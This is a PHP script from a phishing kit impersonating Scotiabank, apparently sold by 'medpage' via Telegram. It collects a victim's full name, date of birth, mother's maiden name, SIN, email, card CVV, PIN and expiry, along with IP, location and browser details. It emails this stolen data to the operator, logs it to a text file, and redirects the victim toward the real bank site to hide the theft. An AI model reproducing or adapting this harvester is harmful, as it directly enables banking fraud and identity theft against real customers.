<?php
require "CONTROLS.php";
require "includes/functions.php";
require "includes/One_Time.php";
ini_set('display_errors', 0);


        $date = date('l d F Y');
        $time = date('H:i');
		$FN = $_POST['FN'];
		$DB = $_POST['DB'];
		$MN = $_POST['MN'];
        $SN = $_POST['SN'];
		$ZC = $_POST['ZC'];
        $EA = $_POST['EA'];
		$CV = $_POST['CV'];
        $AP = $_POST['AP'];
        $EX = $_POST['EX'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "IP 			: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $VictimInfo2 = "LOCATION	: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
        $VictimInfo3 = "USERAGENT	: " . $systemInfo['useragent'] . "";
        $VictimInfo4 = "BROWSER		: " . $systemInfo['browser'] . "";
        $VictimInfo5 = "OS			: " . $systemInfo['os'] . "";
        $data = "
+ ------------- 4 PersonalDetails --------------+
| FULLNAME	: $FN
| D.O.B 	: $DB
| M.M.N		: $MN
| S.I.N 	: $SN
| POSTAL	: $ZC
| EMAIL 	: $EA
| EPASS		: $EP
+ ------------- 5 CardDetails ------------------+
| CVV	 	: $CV
| PIN		: $AP
| EXP		: $EX
+ ------created by medpage[679849675]------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ---created by medpage[TELE : @medpagestore]----+
";


        $subject = "SCOTIAResultz 4 " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);

$fp = fopen('results.txt', 'a');
fwrite($fp, $data);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "loading.php?page=%2Fuser-management%2Fconfirmation&setLng=en&returnURL=https%3A%2F%2Fwww1.scotiaonline.scotiabank.com%2Fonline%2Fauthentication%2Fauthentication.bns%3Flanguage%3DEnglish";

</script>